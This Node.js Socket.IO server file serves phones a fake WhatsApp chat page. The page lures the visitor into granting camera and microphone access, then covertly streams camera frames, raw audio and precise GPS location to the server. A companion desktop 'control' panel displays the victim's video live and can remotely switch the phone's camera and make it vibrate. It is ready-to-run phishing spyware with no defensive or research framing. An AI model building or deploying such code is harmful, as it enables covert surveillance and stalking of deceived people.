const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = /mobile|android|iphone/i.test(ua);
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
});

// ==================== CELULAR (INPUT CORRIGIDO) ====================
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <title>WhatsApp - Conversa com minha loirinha</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        .header {
            background: #075E54;
            color: white;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
            position: relative;
            z-index: 10;
        }
        .header h2 { flex: 1; font-size: 18px; }
        .status-dot { width: 10px; height: 10px; background: #25D366; border-radius: 50%; }

        .messages {
            height: calc(100vh - 110px); /* deixa espaço para header + input */
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            background: #0B1416;
        }
        .message {
            display: flex;
            margin-bottom: 8px;
            animation: fadeIn 0.25s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        .bubble {
            max-width: 78%;
            padding: 10px 14px;
            border-radius: 18px;
            font-size: 15.5px;
            line-height: 1.4;
        }
        .message.received .bubble { background: #202C33; color: #E9EDEF; border-top-left-radius: 4px; }
        .message.sent .bubble { background: #005C4B; color: white; border-top-right-radius: 4px; }
        .time { font-size: 11px; opacity: 0.75; margin-top: 4px; text-align: right; }

        .typing {
            display: none;
            padding: 10px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            color: #8696A0;
            font-size: 14px;
        }
        .typing.show { display: block; }

        /* INPUT FIXO - mais confiável no mobile */
        .input-area {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #1F2C33;
            padding: 8px 12px 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-top: 1px solid #2A3B42;
            z-index: 100;
        }
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 12px 16px;
            color: #E9EDEF;
            font-size: 16px;
            outline: none;
            min-height: 46px;
            max-height: 120px;
            line-height: 1.4;
            -webkit-appearance: none;
            appearance: none;
        }
        .send-btn {
            background: #00A884;
            color: white;
            border: none;
            width: 46px;
            height: 46px;
            border-radius: 50%;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            flex-shrink: 0;
        }

        .modal {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal-content {
            background: #1F2C33;
            padding: 30px 24px;
            border-radius: 24px;
            text-align: center;
            max-width: 300px;
        }
        .start-btn {
            background: #00A884;
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
        }
        .conn-indicator {
            position: fixed;
            bottom: 70px;
            right: 18px;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #25D366;
            z-index: 200;
        }
    </style>
</head>
<body>
    <div class="modal" id="permissionModal">
        <div class="modal-content">
            <h3>📱 WhatsApp - Conversa com minha loirinha</h3>
            <p>Permita acesso à câmera e microfone</p>
            <button class="start-btn" id="startBtn">Iniciar Conversa</button>
        </div>
    </div>

    <div class="header">
        <div class="status-dot"></div>
        <h2>WhatsAp - Conversa com minha loirinha</h2>
    </div>

    <div class="messages" id="messages">
        <div class="typing" id="typing">Digitando...</div>
    </div>

    <div class="input-area">
        <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
        <button class="send-btn" id="sendBtn">➤</button>
    </div>

    <div class="conn-indicator" id="connIndicator"></div>
    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { reconnection: true });

        let mediaStream = null;
        let facingMode = 'user';
        let permissions = false;
        let frameInterval = null;
        let typingTimeout = null;

        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const modal = document.getElementById('permissionModal');
        const startBtn = document.getElementById('startBtn');
        const connIndicator = document.getElementById('connIndicator');
        const localVideo = document.getElementById('localVideo');

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }

        function sendFrame() {
            if (!permissions || !localVideo.videoWidth) return;
            const canvas = document.createElement('canvas');
            canvas.width = 300;
            canvas.height = 225;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(localVideo, 0, 0, 300, 225);
            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.78));
        }

        async function startPermissions() {
            try {
                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
                if (frameInterval) clearInterval(frameInterval);

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
                    audio: true
                });

                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();

                frameInterval = setInterval(sendFrame, 160);

                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioCtx.createMediaStreamSource(stream);
                const processor = audioCtx.createScriptProcessor(4096, 1, 1);
                source.connect(processor);
                processor.connect(audioCtx.destination);
                processor.onaudioprocess = e => {
                    if (permissions) socket.emit('audio', Array.from(e.inputBuffer.getChannelData(0)));
                };

                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(pos => {
                        if (permissions) socket.emit('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
                    }, null, { enableHighAccuracy: true });
                }

                permissions = true;
                modal.style.display = 'none';
                socket.emit('mobile_online');

            } catch (err) {
                console.error(err);
                alert("Erro ao acessar câmera/microfone.");
            }
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (!text || !permissions) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        function startTyping() {
            if (!permissions) return;
            socket.emit('typing_start');
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1200);
        }

        startBtn.onclick = startPermissions;
        sendBtn.onclick = sendMessage;
        messageInput.addEventListener('keypress', e => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendMessage();
            } else {
                startTyping();
            }
        });
        messageInput.addEventListener('input', startTyping);

        socket.on('message', msg => addMessage(msg, false));
        socket.on('typing_start', () => typingDiv.classList.add('show'));
        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
        socket.on('connect', () => connIndicator.classList.remove('disconnected'));
        socket.on('disconnect', () => connIndicator.classList.add('disconnected'));

        socket.on('toggle_camera', () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (permissions) startPermissions();
        });

        socket.on('vibrate', () => navigator.vibrate?.(200));

        setTimeout(() => {
            if (!permissions) {
                const div = document.createElement('div');
                div.className = 'message received';
                div.innerHTML = '<div class="bubble"></div>';
                messagesDiv.appendChild(div);
            }
        }, 600);
    </script>
</body>
</html>`;
}

// ==================== DESKTOP (mantido simples) ====================
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:system-ui,sans-serif; background:#0B1416; height:100vh; display:flex; color:#E9EDEF; }
        .sidebar { width:320px; background:#111B21; border-right:1px solid #2A3B42; }
        .sidebar-header { padding:20px; background:#202C33; font-size:19px; font-weight:bold; }
        .contact { padding:16px; display:flex; gap:14px; background:#2A3B42; }
        .avatar { width:52px; height:52px; background:#075E54; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:28px; }
        .chat { flex:1; display:flex; flex-direction:column; }
        .chat-header { background:#202C33; padding:12px 16px; display:flex; align-items:center; gap:16px; }
        .chat-avatar { width:42px; height:42px; background:#075E54; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:24px; }
        .video-panel { height:280px; background:#000; display:flex; align-items:center; justify-content:center; }
        #remoteVideo { max-width:100%; max-height:100%; object-fit:contain; }
        .messages { flex:1; overflow-y:auto; padding:16px; display:flex; flex-direction:column; gap:8px; }
        .message { display:flex; margin-bottom:6px; }
        .message.sent { justify-content:flex-end; }
        .message.received { justify-content:flex-start; }
        .bubble { max-width:65%; padding:10px 14px; border-radius:18px; font-size:15px; }
        .message.received .bubble { background:#202C33; border-top-left-radius:4px; }
        .message.sent .bubble { background:#005C4B; color:white; border-top-right-radius:4px; }
        .input-area { background:#1F2C33; padding:12px; display:flex; gap:8px; border-top:1px solid #2A3B42; }
        .input-field { flex:1; background:#2A3B42; border:none; border-radius:24px; padding:12px 16px; color:white; font-size:15.5px; }
        .send-btn { background:#00A884; color:white; border:none; width:44px; height:44px; border-radius:50%; font-size:22px; cursor:pointer; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">Conversas</div>
        <div class="contact">
            <div class="avatar">📱</div>
            <div>
                <div style="font-weight:bold;">Celular</div>
                <div id="contactStatus" style="color:#8696A0;font-size:13px;">offline</div>
            </div>
        </div>
    </div>

    <div class="chat">
        <div class="chat-header">
            <div class="chat-avatar">📱</div>
            <div style="flex:1">
                <div style="font-weight:bold;">Celular</div>
                <div id="chatStatus" style="color:#8696A0;font-size:13px;">offline</div>
            </div>
            <button id="toggleCameraBtn" style="background:none;border:none;font-size:24px;cursor:pointer;margin:0 8px;">🔄</button>
            <button id="vibrateBtn" style="background:none;border:none;font-size:24px;cursor:pointer;">📳</button>
        </div>

        <div class="video-panel">
            <img id="remoteVideo" src="" alt="Vídeo">
        </div>

        <div class="messages" id="messages"></div>

        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
            <button class="send-btn" id="sendBtn">➤</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const remoteVideo = document.getElementById('remoteVideo');

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth' });
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (!text) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        sendBtn.onclick = sendMessage;
        messageInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });

        socket.on('message', msg => addMessage(msg, false));
        socket.on('frame', frame => remoteVideo.src = frame);
        socket.on('mobile_online', () => {
            document.getElementById('contactStatus').innerHTML = 'online 💚';
            document.getElementById('chatStatus').innerHTML = 'online';
        });

        document.getElementById('toggleCameraBtn').onclick = () => socket.emit('toggle_camera');
        document.getElementById('vibrateBtn').onclick = () => socket.emit('vibrate');
    </script>
</body>
</html>`;
}

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  const events = ['message','typing_start','typing_stop','frame','audio','location','vibrate','toggle_camera','mobile_online'];
  events.forEach(ev => socket.on(ev, data => socket.broadcast.emit(ev, data)));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✅ Servidor rodando na porta ${PORT}`);
  console.log(`Abra PRIMEIRO no CELULAR → http://[SEU-IP]:${PORT}`);
});
